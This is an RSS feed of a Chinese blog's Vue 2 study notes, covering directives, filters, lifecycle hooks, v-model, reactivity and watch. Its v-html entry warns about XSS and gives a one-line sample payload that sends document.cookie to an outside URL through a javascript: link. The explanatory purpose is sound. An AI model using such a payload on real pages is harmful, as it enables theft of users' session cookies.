<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>前端框架 on Rainy · Blog</title>
    <link>https://yxzi.xyz/categories/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6/</link>
    <description>Recent content in 前端框架 on Rainy · Blog</description>
    <image>
      <url>https://yxzi.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://yxzi.xyz/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Sun, 22 May 2022 06:00:00 +0000</lastBuildDate><atom:link href="https://yxzi.xyz/categories/%E5%89%8D%E7%AB%AF%E6%A1%86%E6%9E%B6/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Vue directive</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/directive/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/directive/</guid>
      <description>directive 全局自定义指令。不同 Vue 实例都可以通用的自定义指令。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h2&amp;gt;当前 n 的值为：{{n}}&amp;lt;/h2&amp;gt;  &amp;lt;h2&amp;gt;放大 100 倍的值：&amp;lt;/h2&amp;gt;&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;&amp;#34; v-focus-bind=&amp;#34;n&amp;#34;&amp;gt;  &amp;lt;button @click=&amp;#34;n++&amp;#34;&amp;gt;点击后 n++&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScript
// 全局自定义指令 Vue.directive(&amp;#39;focus-bind&amp;#39;, { 	bind(element, binding) { 	element.value = binding.value; 	}, 	inserted(element, binding) { 	element.focus(); 	}, 	update(element, binding) { 	element.value = binding.value * 100; 	}, }); var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	n: 1, 	}, });  Vue.</description>
    </item>
    
    <item>
      <title>Vue directives</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/directives/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/directives/</guid>
      <description>directives 局部自定义指令，一个指令就是一个函数或对象。
directives中出现的this 都指向 Window。
函数式 函数中有两个参数：
 element：指令所在的 DOM 元素。 binding：一个对象，其中的value 属性就是自定义指令的属性值。  会在什么时候被调用？   指令与元素绑定成功时（初始化）会被调用。但此时元素还没有被 Vue 解析并插入到页面，这会导致在directives中，某些方法不能及时的生效。比如focus()。
  指令所在的模板被重新解析时。
  HTML
 &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h2&amp;gt;当前 n 的值为：{{n}}&amp;lt;/h2&amp;gt;  &amp;lt;h3&amp;gt;放大十倍后的 n 为 ：&amp;lt;span v-big=&amp;#34;n&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/h3&amp;gt;  &amp;lt;button @click=&amp;#34;n++&amp;#34;&amp;gt;点击后 n++&amp;lt;/button&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({ 	el: &amp;#39;#app&amp;#39;, 	data: { 	n: 1, 	}, 	directives: { 	big(element, binding) { 	element.innerText = binding.</description>
    </item>
    
    <item>
      <title>Vue v-cloak</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-cloak/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-cloak/</guid>
      <description>v-cloak 一个没有值的指令。通常配合 CSS 一起用，可以隐藏未经 Vue 解析且带有{{}}的元素，直到 Vue 实例创建完毕。
Vue 实例创建完毕后，元素上的 v-cloak被删除。
HTML
&amp;lt;div v-cloak&amp;gt;  {{ message }} &amp;lt;/div&amp;gt; CSS
[v-cloak] {  display: none; } 该div不会显示，直到 Vue 实例创建完毕。</description>
    </item>
    
    <item>
      <title>Vue v-html</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-html/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-html/</guid>
      <description>v-html 设置元素的 innerHTML，会覆盖元素中的所有内容。但与v-text不同的是，它会识别 HTML 元素
安全性 在网站上动态渲染任意 HTML 是非常危险的，因为容易导致 XSS 攻击。只在可信内容上使用 v-html，永不用在用户提交的内容上。
HTML
&amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;div v-html=&amp;#34;msg&amp;#34;&amp;gt;原内容&amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; JavaScrip
var vm = new Vue({el: &amp;#39;#app&amp;#39;,data: {msg: &amp;#39;&amp;lt;a href=javascript:location.href=&amp;#34;http://www.baidu.com?&amp;#34; + document.cookie&amp;gt;XXS 攻击&amp;lt;/a&amp;gt; &amp;#39;,},});Vue.config.productionTip = false; </description>
    </item>
    
    <item>
      <title>Vue v-once</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-once/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-once/</guid>
      <description>v-once 一个没有值的指令。只渲染当前元素一次。之后该元素被视为静态内容。可以用于优化性能。</description>
    </item>
    
    <item>
      <title>Vue v-pre</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-pre/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-pre/</guid>
      <description>v-pre 跳过当前元素和它的子元素的编译过程。使页面显示原始 Mustache 元素。
用于跳过大量没有使用指令的元素，这会加快编译速度。</description>
    </item>
    
    <item>
      <title>Vue v-text</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-text/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/v-text/</guid>
      <description>v-text 设置元素的文本内容。会覆盖元素中的所有内容。</description>
    </item>
    
    <item>
      <title>Vue 实例方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E5%AE%9E%E4%BE%8B%E6%96%B9%E6%B3%95/</guid>
      <description>实例方法 </description>
    </item>
    
    <item>
      <title>Vue 生命周期函数</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/</guid>
      <description>生命周期函数 在 Vue 的创建、使用、销毁过程中，会有许多事件，这些事件就被统称为生命周期函数，也叫作生命周期钩子。
生命周期函数的名字不可更改，但函数中的代码由我们自定义。
生命周期函数中的 this 的指向是 Vue 实例或组件实例对象。
beforeCreate() 在实例初始化之后，进行数据侦听和数据代理之前调用
created() 在实例创建完成后被立即同步调用。在这一步中，实例已完成对选项的处理，意味着以下内容已被配置完毕：数据侦听、计算属性、方法、事件/侦听器的回调函数。然而，挂载阶段还没开始，
beforeMount() 在挂载开始之前被调用。
mounted() 把初始的真实 DOM 树插入到页面后，即 Vue 实例挂载完毕后调用。
此时一般开始发送 Ajax 请求、启动定时器、绑定自定义事件、订阅消息等初始化操作。
beforeUpdate 在数据发生改变后，DOM 被更新之前被调用。此时的数据已经被改变，但页面中不是最新的数据。
updated() 此时的数据已经被改变，且页面中也是最新的数据。
beforeDestroy() 实例销毁之前调用。在这一步，实例仍然完全可用。但无法引起页面中的数据更新。
此时一般开始清除定时器、解绑自定义事件、取消订阅消息等收尾操作。
一般不在该流程操作数据，因为在此时改变数据，并不会引起页面中的数据更新。
destroyed() 实例销毁后调用。</description>
    </item>
    
    <item>
      <title>Vue 生命周期流程</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%87%BD%E6%95%B0/%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E6%B5%81%E7%A8%8B/</guid>
      <description>生命周期流程 flowchart TD;newVue[&amp;#34;new Vue()&amp;#34;] --&amp;gt; init[&amp;#34;初始化：事件、生命周期、但数据代理未开始。&amp;#34;];init --&amp;gt; beforeCraeate[&amp;#34;beforeCraeate()：此时无法通过 vm 访问 data 中的数据，以及 methods 中的方法。&amp;#34;];beforeCraeate --&amp;gt; againInit[&amp;#34;初始化：数据检测、数据代理。&amp;#34;];againInit ---&amp;gt;created[&amp;#34;created()：可以通过 vm 访问到 data 中的数据，以及 methods 中的方法。&amp;#34;];created --&amp;gt; 挂载流程开始挂载流程开始 --&amp;gt; el[&amp;#34;是否配置 el 选项？&amp;#34;]el --&amp;gt;|Yse| template[&amp;#34;是否配置 template 选项？&amp;#34;];el --&amp;gt;|No| $mount[&amp;#34;当 vm.$mount(el) 调用的时候&amp;#34;];$mount --&amp;gt;template;template --&amp;gt;|Yes| compileTemplate[&amp;#34;编译 template 到 render() 中&amp;#34;]compileTemplate --&amp;gt;stageOnetemplate --&amp;gt;|No|compileEl[&amp;#34;编译 el 指定元的outerHTML 作为 template&amp;#34;];compileEl --&amp;gt; stageOne[&amp;#34;此阶段 Vue 开始解析模板，生成虚拟 DOM（内存中），但页面还无法显示解析好的内容。&amp;#34;]stageOne ---&amp;gt;beforeMount[&amp;#34;beforeMount()：此时，页面呈现的是未经 Vue 编译的 DOM 结构。&amp;lt;/br&amp;gt; 此时，所有对 DOM 的操作，最终都没有效果（在 beforeMount 之前才有效果）。&amp;#34;];beforeMount --&amp;gt; $el[&amp;#34;将内存中的虚拟 DOM 转化为真实 DOM 插入到页面。（还将真实 DOM 拷贝了一份在 $el 中）&amp;#34;]$el --&amp;gt; mouted[&amp;#34;mouted()：页面中呈现的都是经过 Vue 编译到 DOM。&amp;lt;/br&amp;gt; 对 DOM 的操作均有效（但尽可能避免），至此初始化过程结束，一般在此进行：开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作。&amp;#34;]mouted ---&amp;gt;mountEnd[&amp;#34;mouted()：此时，挂载流程结束。更新流程开始&amp;#34;];mountEnd --&amp;gt; changes[&amp;#34;当 data 中的数据发生变化&amp;#34;];changes --&amp;gt; beforeUpdate[&amp;#34;beforeUpdate()：此时，data 中的数据是新的，但页面中的数据是旧的，即：页面尚未和最新的数据保持同步。&amp;#34;];beforeUpdate --&amp;gt; compareVNode[&amp;#34;根据新数据，生成新的虚拟 DOM，随后与旧的虚拟DOM进行比对，最终完成页面更新，即：完成了 Model —&amp;gt; view 的更新&amp;#34;];compareVNode --&amp;gt; updated[&amp;#34;updated()：此时，数据和页面都是最新的（方法和数据都可用，且能引起页面上的数据更新），即：页面和数据保持同步。&amp;#34;];updated --&amp;gt; mountEnd;updated ---&amp;gt; $destroy[&amp;#34;vm.</description>
    </item>
    
    <item>
      <title>Vue 自定义指令</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</link>
      <pubDate>Sun, 22 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/</guid>
      <description>自定义指令 定义指令时，指令名不加v-，使用的时候需要加v-。
指令名如果是多个单词，多个单词用-隔开。</description>
    </item>
    
    <item>
      <title>Vue filter</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/filter/</link>
      <pubDate>Sat, 21 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/filter/</guid>
      <description>filter 全局过滤器，不同 Vue 实例都可以通用的过滤器。
当全局过滤器和局部过滤器重名时，会采用局部过滤器。
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://unpkg.com/dayjs@1.8.21/dayjs.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;全局过滤器&amp;lt;/title&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;!-- 全局过滤器 --&amp;gt;  &amp;lt;h3 v-bind:id=&amp;#34;msg | mySlice&amp;#34;&amp;gt;全局过滤器&amp;lt;/h3&amp;gt;  &amp;lt;/div&amp;gt;  &amp;lt;/body&amp;gt;  &amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;/html&amp;gt; JavaScript
// 全局过滤器 Vue.filter(&amp;#39;mySlice&amp;#39;, function () { 	return val.</description>
    </item>
    
    <item>
      <title>Vue filters</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/filters/</link>
      <pubDate>Sat, 21 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/filters/</guid>
      <description>filters 局部过滤器，只能在啊当前 Vue 实例中使用的过滤器。它将|之前的数据当作参数，并传递给在|之后的过滤函数，并作为该过滤函数的参数。
过滤函数的返回值会被作为最终值解析到模板中。
传参 过滤函数除了可以将在|之前的数据当作第一个实参时，还能接受额外的其他参数。
串联 过滤器中的多个过滤函数可以串联，用|将不同的过滤器函数分开，前一个函数的返回值会被当作后一个函数的实参。
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://unpkg.com/dayjs@1.8.21/dayjs.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;j&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;   &amp;lt;/style&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;!-- 过滤器 --&amp;gt;  &amp;lt;h3&amp;gt;Vue - filters：{{time | timeFmt}}&amp;lt;/h3&amp;gt;  &amp;lt;!-- 过滤器地传参 --&amp;gt;  &amp;lt;h3&amp;gt;Vue - filters：{{time | timeFmt(&amp;#39;YYYY——MM——DD&amp;#39;)}}&amp;lt;/h3&amp;gt;  &amp;lt;!</description>
    </item>
    
    <item>
      <title>Vue 过滤器</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/%E8%BF%87%E6%BB%A4%E5%99%A8/</link>
      <pubDate>Sat, 21 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E8%BF%87%E6%BB%A4%E5%99%A8/%E8%BF%87%E6%BB%A4%E5%99%A8/</guid>
      <description>过滤器 对数据进行格式化后再显示。
一般用在{{}}或v-bind之中，
过滤器不会改变原来的数据。</description>
    </item>
    
    <item>
      <title>Vue 修饰符</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</link>
      <pubDate>Fri, 20 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E4%BF%AE%E9%A5%B0%E7%AC%A6/</guid>
      <description>修饰符 lazy 默认情况下，v-model会实时的同步元素中的数据，但如果添加了lazy，则数据会在当前元素失去焦点的时候同步元素中的数据。
trim 自动过滤输入框中的首尾空白字符。
number 自动将输入框中的内容转为数值类型。
通常是将字符串转换为数值。</description>
    </item>
    
    <item>
      <title>Vue v-model</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/v-model/</link>
      <pubDate>Thu, 19 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/v-model/</guid>
      <description>v-model 双向数据绑定，常用于表单元素（有 value 值）。
双向绑定是指：数据不仅能从 data 流向页面，也能从页面流向 data。
该指令是v-on与v-bind的复合版。
&amp;lt;!-- 类似于语法糖的写法 --&amp;gt; &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h1&amp;gt;{{text}}&amp;lt;/h1&amp;gt;  &amp;lt;input type=&amp;#34;text&amp;#34; v-model=&amp;#34;text&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; &amp;lt;!-- 相当于这样写--&amp;gt; &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h1&amp;gt;{{text}}&amp;lt;/h1&amp;gt;  &amp;lt;input type=&amp;#34;text&amp;#34; :value=&amp;#34;text&amp;#34; @input=&amp;#34;text = $event.target.value&amp;#34;&amp;gt; &amp;lt;/div&amp;gt; </description>
    </item>
    
    <item>
      <title>Vue 收集表单数据</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/</link>
      <pubDate>Thu, 19 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%8C%87%E4%BB%A4/%E8%A1%A8%E5%8D%95%E8%BE%93%E5%85%A5%E7%BB%91%E5%AE%9A/%E6%94%B6%E9%9B%86%E8%A1%A8%E5%8D%95%E6%95%B0%E6%8D%AE/</guid>
      <description>收集表单数据 用 v-model 在表单 input textarea及 select 上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。
type = radio 则v-mode1收 集的是value值，且要给不同的&amp;lt;input type=&amp;quot;radio&amp;quot; /&amp;gt;配置 相同的value 值。
type = checkbox  没有配置 input 的value属性，那么v-mode1收集的就是一个布尔值（勾选 or 未勾选，） 配置input的value属性:  v- mode1的初始值是非数组，那么收集的就是布尔值（勾选 or 未勾选） v-mode1的初始值是数组，那么v-mode1收集的的就是value的属性值所组成的数组。    备注: v-mode1的 三个修饰符:
 lazy:失去焦点再收集数据 number:输入字符串转为有效的数字 trim:输入首尾空格过滤  HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;学习&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;   &amp;lt;/style&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;form&amp;gt;  账号：&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; v-model.</description>
    </item>
    
    <item>
      <title>Vue 数据响应式</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/</link>
      <pubDate>Thu, 19 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/</guid>
      <description>数据响应式 Vue 会监视 data 中所有层级的数据。
数据劫持 指的是在访问或者修改对象的某个属性时，通过一段代码拦截这个行为，进行额外的操作或者修改返回结果。
在 Vue 中，是通过给对象添加一个setter()来实现的数据劫持这个行为的。
如何响应对象中的数据？ 通过 setter()实现响应，且要在 nwe Vue 时就传入要响应的数据。
 new Vue 之后再追加的对象属性，Vue 默认不响应。 若需要让 Vue 响应 new Vue 之后追加的对象属性，需要使用 Vue.set()或则 vm.$set()  如何响应数组中的数据？ 通过包裹数组更新元素的方法实现：
 调用原生更新元素的方法实现对数组进行更新。 重新解析模板，进而更新页面。  原生数组被包裹的方法有：
 push() pop() shift() unshift() splice() sort() reverse()  只要使用以上方法更新数组中的元素，那么就可以实现响应数组中的数据。
不完整的数据响应式实现 // 模仿 Vue 实现响应式的过程， // 缺陷一：无法直接 vm.attr // 缺陷二：多层级的属性无法被监听到 var data = { 	name: &amp;#39;黔灵山&amp;#39;, 	address: &amp;#39;贵阳&amp;#39;, 	age: 35, };  // 创建一个监视的实例对象，用于监视 data 中属性的变化  var obs = new Observer(data);  // 此时 data 中有的属性，obs 中都有。  // 定义一个 vm 实例对象 var vm = {}; vm.</description>
    </item>
    
    <item>
      <title>Vue Class 与 Style 绑定</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/class-%E4%B8%8E-style-%E7%BB%91%E5%AE%9A/</link>
      <pubDate>Wed, 18 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/class-%E4%B8%8E-style-%E7%BB%91%E5%AE%9A/</guid>
      <description>Class 与 Style 绑定 绑定 Class 字符串 适合场景：类名不确定，且需要要动态获取。
对象 适合场景：要绑定多个类名，类名个数确定，类名也确定，但需要动态决定是否要应用样式。
通过修改属性的布尔值来决定是否启用当前样式。
数组 适合场景：要绑定多个类名，类名个数不确定，类名也不确定。
通过向数组中添加元素来增加类名，删除元素来移除类名。
绑定内联样式 对象 CSS 属性名可以用小驼峰式或短横线分隔（用引号括起来）来命名。其中 CSS 属性指是动态值
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;Vue&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;  .basic {  width: 100px;  height: 100px;  margin-top: 10px;  border: 1px solid #000;  }   .</description>
    </item>
    
    <item>
      <title>Vue watch</title>
      <link>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/watch/</link>
      <pubDate>Wed, 18 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/frame/vue/vue-2/%E6%95%B0%E6%8D%AE%E9%80%89%E9%A1%B9/watch/</guid>
      <description>watch 侦听器，用于侦听 Vue 实例上的数据变动。
HTML
&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34; /&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34; /&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34; /&amp;gt;  &amp;lt;script src=&amp;#34;https://cdn.bootcdn.net/ajax/libs/vue/2.6.9/vue.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;title&amp;gt;Vue&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;   &amp;lt;/style&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;div id=&amp;#34;app&amp;#34;&amp;gt;  &amp;lt;h2&amp;gt;今天天气很{{weather}}&amp;lt;/h2&amp;gt;  &amp;lt;button @click=&amp;#39;handoff&amp;#39;&amp;gt;切换天气&amp;lt;/button&amp;gt;  &amp;lt;h2&amp;gt;{{number.a}}&amp;lt;/h2&amp;gt;  &amp;lt;button @click=&amp;#34;number.a++&amp;#34;&amp;gt;深度监听a&amp;lt;/button&amp;gt;  &amp;lt;h2&amp;gt;{{number.b}}&amp;lt;/h2&amp;gt;  &amp;lt;button @click=&amp;#34;number.b++&amp;#34;&amp;gt;深度监听b&amp;lt;/button&amp;gt;  &amp;lt;/div&amp;gt;   